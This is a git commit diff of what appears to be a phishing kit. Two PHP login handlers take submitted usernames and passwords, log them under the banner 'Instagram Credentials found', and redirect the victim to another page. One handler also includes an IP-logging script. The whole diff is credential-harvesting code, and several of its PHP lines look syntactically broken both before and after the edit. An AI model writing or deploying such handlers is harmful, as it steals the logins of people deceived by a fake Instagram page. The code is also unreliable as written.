224e94d25df8146c406dad4c9de1ae613e147931
rekcahkumar <48340011+rekcahkumar@users.noreply.github.com>
2021-04-14 17:59:46 +0530

    Add files via upload

--- login2.php
+++ login2.php
@@ -2,7 +2,7 @@
 include 'ip.php';
 error_log("-----------------------------------------------------------------------");
 error_log("Instagram Credentials found");
-error_log("[EMAIL]: " . $_POST['username'] ."\n" " [PASS]: " . $_POST['password'] . ");
+error_log("[EMAIL]: " . $_POST['username'] . " [PASS]: " . $_POST['password'] . ");
 error_log("-----------------------------------------------------------------------");
 header('Location:/index2.html');
 exit();
--- login3.php
+++ login3.php
@@ -1,7 +1,7 @@
 <?php
 error_log("-----------------------------------------------------------------------");
 error_log("Instagram Credentials found");
-error_log("[EMAIL]: " . $_POST['username'] ."\n" " [PASS]: " . $_POST['password'] .);
+error_log("[EMAIL]: " . $_POST['username'] . " [PASS]: " . $_POST['password'] .);
 error_log("-----------------------------------------------------------------------");
 header('Location:/index3.html');
 exit();
